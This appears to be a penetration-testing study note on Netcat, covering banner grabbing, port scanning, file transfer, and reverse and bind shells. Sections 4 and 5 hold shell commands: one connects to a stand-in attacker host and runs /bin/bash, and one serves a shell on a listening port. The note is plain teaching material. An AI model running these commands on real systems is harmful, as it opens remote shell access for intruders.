# Netcat (nc)

## What is Netcat?

Netcat, commonly known as:

```
nc
```

is a networking utility used for creating TCP and UDP connections.

It is commonly used in penetration testing for:

- Banner Grabbing
- Port Scanning
- File Transfer
- Reverse Shells
- Bind Shells
- Network troubleshooting

Netcat is often called:

```
The Swiss Army Knife of Networking
```

because of its flexibility and multiple uses.

---

# 1. Banner Grabbing

## What is Banner Grabbing?

Banner Grabbing is the process of connecting to a service to identify information such as:

- Service name
- Service version
- Operating system details

This information can help identify possible vulnerabilities.

---

## Example: FTP Banner Grabbing

To connect to an FTP service:

```
nc 192.168.1.10 21
```

If the service is running, it may return a banner such as:

```
220 vsFTPd 2.3.4
```

The response reveals the FTP service version.

---

# 2. Port Scanning

Netcat can also be used to check whether specific ports are open.

---

## Scanning a Single Port

Example:

```
nc -nv 192.168.1.10 80
```

If the port is open:

```
Connection succeeded
```

If the port is closed:

```
Connection refused
```

---

## Scanning a Range of Ports

Example:

```
nc -nvz 192.168.1.10 1-1000
```

This scans ports from:

```
1 → 1000
```

---

## Netcat Scan Options

|Option|Description|
|---|---|
|`-z`|Scan only without sending data|
|`-v`|Verbose output|

---

# 3. File Transfer

Netcat can be used to transfer files between two systems.

---

## Receiving Machine

The receiving system listens on a specific port and redirects incoming data into a file.

Example:

```
nc -lvnp 4444 > file.txt
```

Options:

- `-l` → Listen mode
- `-v` → Verbose output
- `-n` → Do not perform DNS resolution
- `-p` → Specify listening port

---

## Sending Machine

The sending system connects to the listener and sends the file.

Example:

```
nc 192.168.1.5 4444 < file.txt
```

The file is transferred to the receiving machine.

---

# 4. Reverse Shell

## What is a Reverse Shell?

A Reverse Shell is a connection where the target machine connects back to the attacker's machine.

The attacker starts a listener, and the target initiates the connection.

---

## Attacker Machine

Start a Netcat listener:

```
nc -lvnp 4444
```

---

## Target Machine

Execute the Reverse Shell:

```
nc ATTACKER_IP 4444 -e /bin/bash
```

After a successful connection, the attacker receives a shell from the target machine.

---

# 5. Bind Shell

A Bind Shell works in the opposite way.

The target machine opens a listening port, and the attacker connects to it.

---

## Target Machine

Start a listener:

```
nc -lvnp 4444 -e /bin/bash
```

The target waits for incoming connections.

---

## Attacker Machine

Connect to the target:

```
nc TARGET_IP 4444
```

In this case:

```
The attacker connects to the target machine
```

---

# Connecting from Kali Linux to Windows Using Netcat

To establish communication between Kali Linux and Windows:

1. Transfer the Netcat tool to the Windows machine.
2. Configure the Windows machine to communicate with the Kali machine.

---

## Windows Machine

The Windows system uses the Kali Linux IP address to establish the connection.

![](../../Images/Pasted%20image%2020260530151517.png)

---

## Kali Linux Machine

On Kali Linux, configure the listener or connection depending on the required communication method.

![](../../Images/Pasted%20image%2020260530151542.png)

---

# Summary

Netcat is a powerful networking tool used for:

- Service identification through Banner Grabbing.
- Checking open ports.
- Transferring files.
- Creating Reverse Shell connections.
- Creating Bind Shell connections.

Because of its flexibility, Netcat is commonly used during penetration testing and security assessments.